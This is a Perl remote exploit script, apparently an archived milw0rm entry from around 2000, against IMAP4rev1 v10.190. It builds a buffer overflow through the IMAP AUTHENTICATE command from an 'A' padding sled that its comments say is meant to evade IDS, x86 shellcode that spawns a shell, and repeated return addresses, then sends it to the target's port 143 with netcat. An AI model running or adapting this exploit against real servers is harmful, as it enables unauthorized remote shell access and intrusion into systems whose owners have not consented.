#!/usr/bin/perl

## * Successfully tested on IMAP4rev1 v10.190 *
## Written by: teleh0r@doglover.com / anno 2000
##
## This is nothing new - just wrote it for fun.

$shellcode = "\xeb\x35\x5e\x80\x46\x01\x30\x80\x46\x02\x30\x80".
             "\x46\x03\x30\x80\x46\x05\x30\x80\x46\x06\x30\x89".
             "\xf0\x89\x46\x08\x31\xc0\x88\x46\x07\x89\x46\x0c".
             "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80".
             "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xc6\xff\xff\xff".
             "\x2f\x32\x39\x3e\x2f\x43\x38";


$len = 1052;       # Sufficient to overwrite the return value.
$nop = A;          # Using A/0x41 as nops to try to fool IDS.
$ret = 0xbffff30f; # Return Value / ESP / Stack Pointer.

if (@ARGV < 2) {
    print("Usage: $0 <target> <offset>\n");
    exit(1);
}

($target, $offset) = @ARGV;

for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}

$buffer .= $shellcode;
$new_ret = pack('l', ($ret + $offset));

for ($i += length($shellcode); $i < $len; $i += 4) {
    $buffer .= $new_ret;
}

$exploit_string = "* AUTHENTICATE {$len}\015\012$buffer\012";

system("(echo -e \"$exploit_string\" ; cat) | nc $target 143");


# milw0rm.com [2001-01-19]
